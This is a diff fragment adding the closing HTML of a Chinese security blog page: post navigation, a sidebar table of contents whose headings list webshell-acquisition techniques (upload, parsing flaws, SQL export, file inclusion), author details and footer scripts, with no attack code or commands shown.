+                <a href="/2020/02/22/Tomcat包含漏洞复现/" rel="next" title="Tomcat AJP 任意文件读取和包含漏洞">
+                  <i class="fa fa-chevron-left"></i> Tomcat AJP 任意文件读取和包含漏洞
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/2020/02/23/反弹shell脚本收集/" rel="prev" title="反弹shell脚本收集">
+                  反弹shell脚本收集 <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#进后台Getshell"><span class="nav-number">1.</span> <span class="nav-text">进后台Getshell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#管理员后台直接Getshell"><span class="nav-number">1.1.</span> <span class="nav-text">管理员后台直接Getshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#后台数据库备份Getshell"><span class="nav-number">1.2.</span> <span class="nav-text">后台数据库备份Getshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#各类上传Getshell"><span class="nav-number">1.3.</span> <span class="nav-text">各类上传Getshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#修改网站上传类型Getshell"><span class="nav-number">1.4.</span> <span class="nav-text">修改网站上传类型Getshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#上传其他脚本类型Getshell"><span class="nav-number">1.5.</span> <span class="nav-text">上传其他脚本类型Getshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解析漏洞Getshell"><span class="nav-number">1.6.</span> <span class="nav-text">解析漏洞Getshell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#IIS6-0解析漏洞"><span class="nav-number">1.6.1.</span> <span class="nav-text">IIS6.0解析漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#IIS7-0-7-5、Nginx-lt-8-0解析漏洞"><span class="nav-number">1.6.2.</span> <span class="nav-text">IIS7.0/7.5、Nginx&lt;8.0解析漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Nginx-lt-8-03空字节代码执行漏洞"><span class="nav-number">1.6.3.</span> <span class="nav-text">Nginx&lt;8.03空字节代码执行漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Apache解析漏洞"><span class="nav-number">1.6.4.</span> <span class="nav-text">Apache解析漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CVE-2013-4547-Nginx解析漏洞"><span class="nav-number">1.6.5.</span> <span class="nav-text">CVE-2013-4547 Nginx解析漏洞</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#编辑器漏洞Getshell"><span class="nav-number">1.7.</span> <span class="nav-text">编辑器漏洞Getshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#网站配置插马Getshell"><span class="nav-number">1.8.</span> <span class="nav-text">网站配置插马Getshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#编辑器模版Getshell"><span class="nav-number">1.9.</span> <span class="nav-text">编辑器模版Getshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#修改脚本文件Getshell"><span class="nav-number">1.10.</span> <span class="nav-text">修改脚本文件Getshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#执行sql语句写入Webshell"><span class="nav-number">1.11.</span> <span class="nav-text">执行sql语句写入Webshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#命令执行Getshell"><span class="nav-number">1.12.</span> <span class="nav-text">命令执行Getshell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Windows"><span class="nav-number">1.12.1.</span> <span class="nav-text">Windows</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Linux"><span class="nav-number">1.12.2.</span> <span class="nav-text">Linux</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#文件包含Getshell"><span class="nav-number">1.13.</span> <span class="nav-text">文件包含Getshell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#asp包含"><span class="nav-number">1.13.1.</span> <span class="nav-text">asp包含</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#php包含"><span class="nav-number">1.13.2.</span> <span class="nav-text">php包含</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#使用php-input"><span class="nav-number">1.13.3.</span> <span class="nav-text">使用php://input</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#数据库命令执行Getshell"><span class="nav-number">1.14.</span> <span class="nav-text">数据库命令执行Getshell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Access导出"><span class="nav-number">1.14.1.</span> <span class="nav-text">Access导出</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Sqlserver导出"><span class="nav-number">1.14.2.</span> <span class="nav-text">Sqlserver导出</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Mysql导出"><span class="nav-number">1.14.3.</span> <span class="nav-text">Mysql导出</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#方式一"><span class="nav-number">1.14.3.1.</span> <span class="nav-text">方式一</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#方式二"><span class="nav-number">1.14.3.2.</span> <span class="nav-text">方式二</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#方式三"><span class="nav-number">1.14.3.3.</span> <span class="nav-text">方式三</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#方式四通过load-file函数直接加载该文件内容"><span class="nav-number">1.14.3.4.</span> <span class="nav-text">方式四通过load_file函数直接加载该文件内容</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#方式五"><span class="nav-number">1.14.3.5.</span> <span class="nav-text">方式五</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#方式六"><span class="nav-number">1.14.3.6.</span> <span class="nav-text">方式六</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#方式七"><span class="nav-number">1.14.3.7.</span> <span class="nav-text">方式七</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#方式八"><span class="nav-number">1.14.3.8.</span> <span class="nav-text">方式八</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#不进后台Getshell"><span class="nav-number">2.</span> <span class="nav-text">不进后台Getshell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0day-Getshell"><span class="nav-number">2.1.</span> <span class="nav-text">0day Getshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#写入日志Getshell"><span class="nav-number">2.2.</span> <span class="nav-text">写入日志Getshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IIS-Tomcat写权限Getshell"><span class="nav-number">2.3.</span> <span class="nav-text">IIS/Tomcat写权限Getshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#上传漏洞Getshell"><span class="nav-number">2.4.</span> <span class="nav-text">上传漏洞Getshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#上传会员头像Getshell"><span class="nav-number">2.5.</span> <span class="nav-text">上传会员头像Getshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#注入漏洞Getshell"><span class="nav-number">2.6.</span> <span class="nav-text">注入漏洞Getshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#远程命令执行"><span class="nav-number">2.7.</span> <span class="nav-text">远程命令执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#其他漏洞Getshell"><span class="nav-number">2.8.</span> <span class="nav-text">其他漏洞Getshell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">3.</span> <span class="nav-text">参考</span></a></li></ol></div>
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/author.jpg"
+      alt="C0cho">
+  <p class="site-author-name" itemprop="name">C0cho</p>
+  <div class="site-description" itemprop="description">记录生活的点点滴滴</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">76</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        <span class="site-state-item-count">44</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+</div>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/yourname" title="GitHub &rarr; https://github.com/yourname" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="mailto:yourname@gmail.com" title="E-Mail &rarr; mailto:yourname@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">C0cho</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    
+    <span title="站点总字数">262k</span>
+</div>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.1"></script><script src="/js/motion.js?v=7.4.1"></script>
+<script src="/js/schemes/pisces.js?v=7.4.1"></script>
+
+<script src="/js/next-boot.js?v=7.4.1"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.4.1"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
